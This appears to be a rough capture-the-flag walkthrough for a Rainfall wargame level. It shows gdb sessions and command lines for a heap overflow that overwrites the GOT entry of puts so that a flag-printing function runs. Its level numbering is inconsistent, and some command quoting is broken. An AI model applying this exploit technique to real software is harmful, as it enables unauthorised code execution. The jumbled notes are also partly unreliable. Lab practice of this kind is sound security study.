# Rainfall - Level3 Walkthrough

We copy the file `/home/user/level6/level6` locally:

```bash
scp -P 4242 level6@{IP}:/home/user/level6/level6 .
```

**Step 1**
Open the binary in Ghidra.

**Step 2**

The `main` function stores the flag in global variable `c`.
```c
__stream = fopen("/home/user/level8/.pass","r");
fgets(c,0x44,__stream);
```

The `m` function displays the variable `c`.
```c
printf("%s - %d\n",c,tVar1);
```


--- 

Then in main puts is used.
If we could do so `puts` points to `m`, the flag would be displayed

(gdb) info func
...
0x08048400  puts
...

(gdb) disas *0x08048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.

The address of puts is 0x8049928

In gdb We add breakpoints after the mallocs

```bash
gdb ./level7
b *0x08048536
b *0x08048550
b *0x08048565
b *0x0804857f
```

eax respectively

0x804a008
0x804a018
0x804a028
0x804a038


----


```bash
level7@RainFall:~$ file level7 
level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaee40d38d396a2ba3356a99de2d8afc4874319e2, not stripped

level7@RainFall:~$ checksec --file level7 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level7
```

## resources

https://medium.com/@0xwan/binary-exploitation-heap-overflow-to-overwrite-got-d3c7d97716f1




---

0x0804a038

0x0804a038
\x38\xa0\x04\x08


addresse de puts

0x8049928
\x28\x99\x04\x08

que l'on veut remplacer par:

l'adresse de m

0x080484f4
\xf4\x84\x04\x08



run $(python -c print'"A"*20 + "\x28\x99\x04\x08"') 0x080484f4

Print heap memory with
x/120x 0x804a008

---


disas main
...
0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
0x08048536 <+21>:	mov    %eax,0x1c(%esp)
...
0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
...

break *0x08048536
break *0x080485d3

First break after first malloc, we'll check the value of eax to check where is our pointer on the heap
Second break just before fopen as this fails in GDB and would segfault next line

(gdb) run AAAA BBBB

# Retrieve allocated pointer
(gdb) info register eax
eax            0x804a008	134520840

# Go to next breakpoint
(gdb) continue

# Display heap memory after the first allocation
(gdb) x/100x 0x804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x41414141	0x00000000	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
0x804a038:	0x42424242	0x00000000	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000

# We notice here that AAAA is at address 0x804a018
# We notice here that BBBB is at address 0x804a038
# This address 0x804a028 is also stored in between (wit20 padding after )


run $(python -c print'"A"*20 + "\x98\xa0\x04\x08"') BBBB

m little endian
\xf4\x84\x04\x08

0x8049928
\x28\x99\x04\x08


0x8049928

run $(python -c print'"A"*20 + "\x28\x99\x04\x08"') $(echo -ne '\xf4\x84\x04\x08')